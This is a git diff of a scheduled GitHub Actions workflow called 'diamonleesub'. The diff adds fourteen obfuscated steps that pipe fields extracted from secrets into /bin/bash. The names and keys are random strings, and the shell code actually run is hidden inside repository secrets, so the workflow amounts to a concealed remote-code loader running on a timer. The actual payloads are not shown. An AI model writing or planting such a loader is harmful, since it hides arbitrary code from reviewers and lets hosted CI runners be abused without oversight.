@@ -1,25 +1,30 @@
 name: diamonleesub
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 5/6 * * *'
-jobs:  # 6154
+    - cron: '30 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: diamonleesub
         env:
-          vwgww903: ${{ secrets.vwgww903 }}
+          xho2245: ${{ secrets.xho2245 }}
         run: |
-          echo $vwgww903 | jq -r .psdls3 | /bin/bash
-          echo $hbse93336 | jq -r .o5 | /bin/bash
-          echo $plkey6 | jq -r .ho81 | /bin/bash
-          echo $uzpl7221 | jq -r .sm18073 | /bin/bash
-          echo $e85894 | jq -r .w7009 | /bin/bash
-          echo $znocw368 | jq -r .fwsqf13002 | /bin/bash
-          echo $adqe07902 | jq -r .dnh8 | /bin/bash
-          echo $w5024 | jq -r .dcyr0958 | /bin/bash
-          echo $wqa7124 | jq -r .hda3 | /bin/bash
+          echo $xho2245 | jq -r .yz57120 | /bin/bash
+          echo $oyzzb4 | jq -r .mvxf65 | /bin/bash
+          echo $pwflb6405 | jq -r .a69 | /bin/bash
+          echo $js23 | jq -r .xvukw10063 | /bin/bash
+          echo $b7 | jq -r .quqpq88685 | /bin/bash
+          echo $kscan16 | jq -r .tutc11 | /bin/bash
+          echo $mn74 | jq -r .fz9899 | /bin/bash
+          echo $m6844 | jq -r .dfxrv12527 | /bin/bash
+          echo $zgiwr2 | jq -r .doqh147 | /bin/bash
+          echo $ob699 | jq -r .kjb96 | /bin/bash
+          echo $qbfmk3358 | jq -r .ytrj9 | /bin/bash
+          echo $abu623 | jq -r .vvrye7 | /bin/bash
+          echo $wan908 | jq -r .zeuo34 | /bin/bash
+          echo $bl30 | jq -r .b1 | /bin/bash
 
